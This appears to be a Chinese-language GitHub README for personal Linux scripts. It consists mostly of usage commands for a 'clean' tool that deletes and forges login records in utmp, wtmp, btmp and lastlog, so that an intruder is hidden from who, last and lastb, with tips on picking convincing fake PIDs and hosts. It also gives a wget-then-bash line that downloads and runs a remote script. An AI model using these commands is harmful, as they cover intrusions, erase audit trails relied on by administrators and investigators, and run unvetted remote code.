# SH
我的 Linux 脚本

1、安装AutoSSH

wget -c -N --no-check-certificate "https://raw.githubusercontent.com/sunlewuyou/SH/master/autossh.sh" && bash autossh.sh


2、Linux脚印

wget -c https://raw.githubusercontent.com/sunlewuyou/SH/master/clean
1. 删除utmp记录，将自己从w或者who输出中隐藏
python clean --mode delete --type utmp --user root //删除用户为root的用户记录
python clean --mode delete --type utmp --user root --host "58.47.251.255" //删除用户为root且登录来源host为58.47.251.255的用户记录
2. 删除历史登录记录(wtmp)，隐藏last的记录
python clean --mode delete --type wtmp --user root --host "111.30.32.213" //删除用户为root且登录来源host为111.30.32.213的用户记录
3. 删除btmp记录，隐藏lastb的记录，lastb为登录失败的用户记录
python clean --mode delete --type btmp --user root --host "172.16.50.156" //删除用户为root且登录来源host为127.0.0.1的用户记录
4. 删除lastlog记录，不能通过用户删除，只能通过host或者时间
python clean --mode delete --type lastlog --host "172.16.50.1" //删除来源host的用户登录记录
python clean --mode delete --type lastlog --date "2017-8-2 22:46:34" //删除登录时间为2017-8-2 22:46:34的用户登录记录

python clean --mode delete --type lastlog --date "2018-09-01 03:17:49"
六 9月  1 03:17:49 +0800 2018

伪造日志
1. 伪造utmp记录，将自己从w或者who输出中伪造
python clean --mode add --type utmp --user nobody --tty "pts/8" --pid 25394 --date "2017-8-2 22:46:34" --host "127.0.0.1" //伪造用户为nobody的用户记录
这里伪造的时间和host可以通过who命令去找到，PID一般伪造bash或者ssh通过`ps -aux | grep ssh/bash`去寻找
2. 伪造历史登录记录(wtmp)，伪造last的记录
python clean --mode add  --type wtmp --user root --tty "pts/7" --date "2017-8-2 00:06:34" --host "127.0.0.1"
3. 伪造btmp记录，伪造lastb的记录，lastb为登录失败的用户记录
python clean --mode add  --type btmp --user root --tty "pts/7" --date "2017-8-2 00:06:34" --host "127.0.0.1" //伪造用户为root且登录来源host为127.0.0.1的用户登录失败记录
4. 伪造lastlog记录
python clean --mode add --type=lastlog --user=rootclay --date="2017-7-24 14:22:07" --tty "pts/2" --host "127.0.0.1" //伪造用户为rootclay 时间2017-7-24 14:22:07 来源登录ip为127.0.0.1的用户登录记录

